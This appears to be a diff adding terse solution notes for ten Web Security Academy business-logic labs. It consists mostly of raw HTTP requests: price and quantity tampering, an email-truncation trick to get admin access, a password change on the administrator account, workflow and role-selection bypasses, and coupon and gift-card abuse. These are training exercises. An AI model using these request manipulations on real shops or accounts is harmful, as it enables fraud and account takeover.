@@ -1,0 +1,448 @@
+1) Lab: Excessive trust in client-side controls
+
+---
+
+price in POST request
+
+---
+
+POST /cart HTTP/2
+Host: 0a84007104e399938161845f00bd000a.web-security-academy.net
+Cookie: session=fV9KgxTBpAxWckg87xhXJRpl5VBJkEWH
+Content-Length: 46
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a84007104e399938161845f00bd000a.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a84007104e399938161845f00bd000a.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+productId=1&redir=PRODUCT&quantity=1&price=100
+
+2) Lab: High-level logic vulnerability
+
+Add target item and add item with negative price
+
+---
+
+POST /cart HTTP/2
+Host: 0aa8003603c10ea68358891d00a70063.web-security-academy.net
+Cookie: session=ywxyRbxfOBcNGk1Zz6tLEhn0reiS9GId
+Content-Length: 36
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0aa8003603c10ea68358891d00a70063.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aa8003603c10ea68358891d00a70063.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+productId=1&redir=PRODUCT&quantity=1
+
+---
+
+POST /cart HTTP/2
+Host: 0aa8003603c10ea68358891d00a70063.web-security-academy.net
+Cookie: session=ywxyRbxfOBcNGk1Zz6tLEhn0reiS9GId
+Content-Length: 37
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0aa8003603c10ea68358891d00a70063.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aa8003603c10ea68358891d00a70063.web-security-academy.net/product?productId=2
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+productId=2&redir=PRODUCT&quantity=-1
+
+3) Lab: Low-level logic flaw
+
+POST /cart HTTP/2
+Host: 0a3200b0042776cd80c0c15d001b00a3.web-security-academy.net
+Cookie: session=ppfb0uN6fFWMUCT5tSI1ZslfOJXJHFoN
+Content-Length: 36
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a3200b0042776cd80c0c15d001b00a3.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3200b0042776cd80c0c15d001b00a3.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+productId=1&redir=PRODUCT&quantity=1
+
+---
+
+Using Turbo intruder -> owerflow price
+
+---
+
+Lightweight "l33t" Leather Jacket - 32123 units by $1337.00
+Couple's Umbrella - 13 units - $99.70
+
+4) Lab: Inconsistent handling of exceptional input
+
+https://0ae300ce03d67788812e258b002400dc.web-security-academy.net/admin
+
+->
+
+Admin interface only available if logged in as a DontWannaCry user
+
+---
+
+If you work for DontWannaCry, please use your @dontwannacry.com email address
+
+---
+
+@dontwannacry.com.exploit-0a9500da0330779b81e324a401e100d6.exploit-server.net
+
+---
+
+mail - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0a9500da0330779b81e324a401e100d6.exploit-server.net
+user - test
+pass - test
+
+5) Lab: Inconsistent security controls
+
+Register and change email -> hacker@dontwannacry.com
+
+6) Lab: Weak isolation on dual-use endpoint
+
+---
+
+Remove - current-password=peter
+Change - username=administrator
+
+---
+
+POST /my-account/change-password HTTP/2
+Host: 0af700210384a9c682762e5b00840012.web-security-academy.net
+Cookie: session=Vq0ezqPkwUW7iLlWlBELk9ujP4ljL7AP
+Content-Length: 100
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0af700210384a9c682762e5b00840012.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af700210384a9c682762e5b00840012.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=K880ws1q4fyDgtixgFlDCFcTxhf3pXGW&username=administrator&new-password-1=test&new-password-2=test
+
+7) Lab: Insufficient workflow validation
+
+Buy any product to get link and use it
+
+/cart/order-confirmation?order-confirmed=true
+
+---
+
+POST /cart HTTP/2
+Host: 0a9300bc04de76fe817a57d800000023.web-security-academy.net
+Cookie: session=MAiNvhq67yqEd7t3XGHao4fd8fTU1z4d
+Content-Length: 36
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a9300bc04de76fe817a57d800000023.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a9300bc04de76fe817a57d800000023.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+productId=1&redir=PRODUCT&quantity=1
+
+---
+
+GET /cart/order-confirmation?order-confirmed=true HTTP/2
+Host: 0a9300bc04de76fe817a57d800000023.web-security-academy.net
+Cookie: session=MAiNvhq67yqEd7t3XGHao4fd8fTU1z4d
+Cache-Control: max-age=0
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://0a9300bc04de76fe817a57d800000023.web-security-academy.net/cart
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+8) Lab: Authentication bypass via flawed state machine
+
+Use intruder
+
+---
+
+POST /login HTTP/2
+Host: 0a55004504747095805c941300e400ce.web-security-academy.net
+Cookie: session=El2RiiOIh0P3IQE9qe0pokxZ1gpx6iob
+Content-Length: 68
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a55004504747095805c941300e400ce.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a55004504747095805c941300e400ce.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=4l9d8SZkqB6fQzcGRyCr40KbV1w54uzw&username=wiener&password=peter
+
+---
+
+Drop request -> GET /role-selector
+
+---
+
+GET /admin
+
+9) Lab: Flawed enforcement of business rules
+
+New customers use code at checkout: NEWCUST5
+
+---
+
+Subscribe in bottom site to get code: SIGNUP30
+
+---
+
+Use codes:
+
+Code	Reduction
+NEWCUST5	-$5.00
+SIGNUP30	-$401.10
+NEWCUST5	-$5.00
+SIGNUP30	-$401.10
+NEWCUST5	-$5.00
+SIGNUP30	-$401.10
+NEWCUST5	-$5.00
+SIGNUP30	-$401.10
+
+10) Lab: Infinite money logic flaw
+
+Subscribe to wiener@exploit-0adf00e90444c5a5829fffaf01510047.exploit-server.net
+
+---
+
+Get code: SIGNUP30
+
+---
+
+Add to cart - GIFT CARD
+
+---
+
+Use SIGNUP30
+
+---
+
+Buy GIFT CARD
+
+---
+
+Use GIFT CARD
+
+---
+
+POST /cart HTTP/2
+Host: 0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Cookie: session=XyCy9vqWpBwqBwYMfPHbG24cpomhOhdG
+Content-Length: 36
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net/product?productId=2
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+productId=2&redir=PRODUCT&quantity=1
+
+---
+
+POST /cart/coupon HTTP/2
+Host: 0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Cookie: session=XyCy9vqWpBwqBwYMfPHbG24cpomhOhdG
+Content-Length: 53
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net/cart
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=5jEXoEtRyxnp4ILV65qm6QTNc5Qpz7EO&coupon=SIGNUP30
+
+---
+
+POST /cart/checkout HTTP/2
+Host: 0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Cookie: session=XyCy9vqWpBwqBwYMfPHbG24cpomhOhdG
+Content-Length: 37
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net/cart
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=5jEXoEtRyxnp4ILV65qm6QTNc5Qpz7EO
+
+---
+
+GET /cart/order-confirmation?order-confirmed=true HTTP/2
+Host: 0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Cookie: session=XyCy9vqWpBwqBwYMfPHbG24cpomhOhdG
+Cache-Control: max-age=0
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net/cart
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+POST /gift-card HTTP/2
+Host: 0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Cookie: session=XyCy9vqWpBwqBwYMfPHbG24cpomhOhdG
+Content-Length: 58
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ad600f6035b93b3806dbc5200e800c1.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=5jEXoEtRyxnp4ILV65qm6QTNc5Qpz7EO&gift-card=TLQWWXf7UX
+
+---
+
+Create macros, create rule for macros
+
